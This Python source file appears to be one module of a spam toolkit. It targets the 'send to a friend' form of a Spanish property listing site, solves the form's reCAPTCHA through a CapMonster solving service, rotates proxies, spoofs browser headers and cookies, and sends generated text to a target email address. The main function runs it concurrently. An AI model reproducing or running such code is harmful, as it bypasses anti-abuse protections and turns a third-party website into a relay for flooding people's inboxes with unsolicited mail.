from os.path import basename

import requests

from module import CapMonsterSolver
from module import Spam

pageurl = 'https://solomarspain.com/ru/imushestvo/758/novye-villy-v-benidorme-finestrat-alikante-kosta-blanka-ispaniya/'
googlekey = '6Lffd1gUAAAAAOKkzJkSy7lFSHxP020IYEANNPF6'
solver = CapMonsterSolver()


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:

        cookies = {
            'view': '1',
            'lang': 'ru',
            '_ga': 'GA1.2.60172423.1675442066',
            'cookie': '1',
            'PHPSESSID': 'it67r6ivjhmpljmca9cg715494',
            '_gid': 'GA1.2.1318144458.1675949940',
            '_gat_gtag_UA_119265203_1': '1',
        }

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            # 'Cookie': 'view=1; lang=ru; _ga=GA1.2.60172423.1675442066; cookie=1; PHPSESSID=it67r6ivjhmpljmca9cg715494; _gid=GA1.2.1318144458.1675949940; _gat_gtag_UA_119265203_1=1',
            'Referer': 'https://solomarspain.com/ru/imushestvo/758/novye-villy-v-benidorme-finestrat-alikante-kosta-blanka-ispaniya/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        cap = solver.solve(googlekey, pageurl)
        if not cap:
            return
        params = {
            'name': self.get_text(),
            'email': target,
            'fname': self.get_text(),
            'femail': target,
            'acomment': self.get_text(),
            'lpd': 'on',
            'lang': 'ru',
            'id': '758',
            'f090223': '',
            'g-recaptcha-response': cap,
        }
        for _ in range(10):
            try:
                response = requests.get(
                    'https://solomarspain.com/modules/property/send-friend.php',
                    params=params,
                    cookies=cookies,
                    headers=headers, proxies=self.get_proxies()
                )
                return response
            except Exception as e:
                print(e)
        return


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'ok')
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
